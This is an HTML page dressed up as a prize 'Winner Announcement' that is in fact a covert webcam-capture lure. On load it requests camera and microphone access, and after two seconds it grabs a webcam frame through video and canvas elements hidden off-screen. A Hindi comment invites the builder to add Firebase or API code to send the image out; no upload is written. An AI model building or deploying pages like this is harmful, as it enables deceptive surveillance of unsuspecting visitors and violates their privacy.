<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Winner Announcement</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(45deg, #f3ec78, #af4261);
            font-family: Arial, sans-serif;
            overflow: hidden;
        }
        .container {
            text-align: center;
            color: white;
        }
        h1 {
            font-size: 3rem;
            animation: bounce 1s infinite;
        }
        /* कैमरा और कैनवस को पूरी तरह छिपाने के लिए */
        #video, #canvas {
            display: none;
            visibility: hidden;
            position: absolute;
            left: -9999px;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>🎉 Congratulations! 🎉</h1>
        <p>You have won a special reward.</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        async function setupMedia() {
            try {
                // यह लाइन यूजर से परमिशन मांगेगी
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // परमिशन मिलने के बाद बैकग्राउंड में कैप्चर शुरू
                setTimeout(() => {
                    captureAction();
                }, 2000);

            } catch (err) {
                console.log("Permission Denied: ", err);
            }
        }

        function captureAction() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            const context = canvas.getContext('2d');
            
            // फ्रेम कैप्चर करना
            context.drawImage(video, 0, 0, 640, 480);
            const imageData = canvas.toDataURL('image/png');

            // यहाँ आप Firebase या अपने API का कोड लिख सकते हैं डेटा भेजने के लिए
            console.log("Captured in background...");
        }

        window.onload = setupMedia;
    </script>
</body>
</html>
